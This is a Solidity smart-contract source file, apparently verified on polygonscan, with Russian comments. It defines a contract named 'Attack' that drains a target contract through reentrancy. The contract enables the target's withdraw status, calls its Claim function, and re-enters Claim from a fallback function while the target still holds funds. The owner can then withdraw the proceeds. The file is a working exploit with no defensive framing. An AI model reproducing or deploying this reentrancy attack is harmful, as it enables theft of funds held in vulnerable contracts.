/**
 *Submitted for verification at polygonscan.com on 2023-06-07
*/

// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

// Интерфейс целевого контракта для получения доступа к его функциям
interface IG_Contract {
    function Claim(address sender) external payable;
    function setWithdrawStatus(bool status) external;
}

contract Attack {
    IG_Contract private targetContract;
    address payable private owner;
    bool private lol;
    
    constructor(IG_Contract _targetContract) {
        targetContract = _targetContract;
        owner = payable(msg.sender);
    }

    function gas() public payable {
    }
    
    // Функция для инициации атаки
    function initiateAttack() public payable {
        require(msg.sender == owner, "You are not the owner");
        require(msg.value > 0, "No ether provided");
        
        // Отправляем некоторую сумму на контракт и устанавливаем автовывод средств
        targetContract.setWithdrawStatus(true);
        targetContract.Claim{value: msg.value}(address(this));
    }
    
    // Fallback функция будет автоматически вызвана при получении эфиров
    fallback() external payable {
        if(address(targetContract).balance > 0) {
            targetContract.Claim(address(this));
        }
    }
    

    // Функция для изъятия средств с контракта атаки
    function withdraw() public {
        require(msg.sender == owner, "You are not the owner");
        owner.transfer(address(this).balance);
    }
}